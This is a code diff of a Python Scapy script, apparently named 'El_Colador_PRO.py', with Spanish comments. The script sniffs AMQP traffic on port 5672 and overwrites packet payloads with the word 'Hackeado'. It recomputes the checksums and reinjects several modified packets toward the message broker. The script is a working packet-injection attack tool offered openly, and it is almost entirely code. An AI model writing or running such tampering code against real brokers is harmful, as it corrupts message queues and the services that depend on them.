@@ -1,4 +1,4 @@
-# amqp_duplicate_modify.py
+# El_Colador_PRO.py
 from scapy.all import *
 
 # Pregunta interfaz
@@ -11,30 +11,34 @@ IFACE = "eth0" if input_str == "" else (interfaces[int(input_str) - 1] if input_
 
 FILTER = "tcp dst port 5672 and tcp[tcpflags] & tcp-push != 0"
 
-print(f"[+] Esperando primer paquete PSH hacia 5672 en {IFACE}…")
-pkt = sniff(filter=FILTER, iface=IFACE, count=1, timeout=10)
+print(f"[+] Esperando paquete(s) AMQP válido(s) hacia 5672 en {IFACE}…")
 
-if not pkt:
-    exit("No se detectó paquete válido.")
+N = 5  # Número de paquetes a modificar y reinyectar (aumenta para más chances)
+hack_msg = b"Hackeado"
 
-pkt = pkt[0]
-if not pkt.haslayer(Raw):
-    exit("El paquete no tiene datos AMQP.")
+pkts = sniff(filter=FILTER, iface=IFACE, count=N, timeout=8)
 
-old = pkt[Raw].load
-print(f"[+] Payload original:\n{old}")
+enviados = 0
+for pkt in pkts:
+    if pkt.haslayer(Raw):
+        old = pkt[Raw].load
+        if len(hack_msg) > len(old):
+            nuevo = hack_msg[:len(old)]  # Recorta si el nuevo mensaje es más largo
+        else:
+            nuevo = hack_msg.ljust(len(old), b' ')  # Rellena si es más corto
+        pkt_mod = pkt.copy()
+        pkt_mod[Raw].load = nuevo
+        # Corrige checksums y longitud
+        if pkt_mod.haslayer('IP'):
+            del pkt_mod['IP'].chksum
+            del pkt_mod['IP'].len
+        if pkt_mod.haslayer('TCP'):
+            del pkt_mod['TCP'].chksum
+        print(f"[+] Reinyectando paquete modificado con payload: {nuevo!r}")
+        sendp(pkt_mod, iface=IFACE, verbose=0)
+        enviados += 1
 
-nuevo = input("[?] Nuevo payload (texto, ENTER para usar 'HACKED'): ").encode() or b"HACKED"
-pkt_mod = pkt.copy()
-pkt_mod[Raw].load = nuevo
+if not enviados:
+    print("[!] No se pudo modificar ningún paquete AMQP con datos.")
 
-# Corrige checksums y longitud
-if pkt_mod.haslayer('IP'):
-    del pkt_mod['IP'].chksum
-    del pkt_mod['IP'].len
-if pkt_mod.haslayer('TCP'):
-    del pkt_mod['TCP'].chksum
-
-print(f"[+] Reinyectando paquete modificado en {IFACE}…")
-sendp(pkt_mod, iface=IFACE, verbose=0)
-print("[!] Paquete duplicado y modificado enviado.")
+print(f"[!] {enviados} paquetes modificados y enviados al broker.")
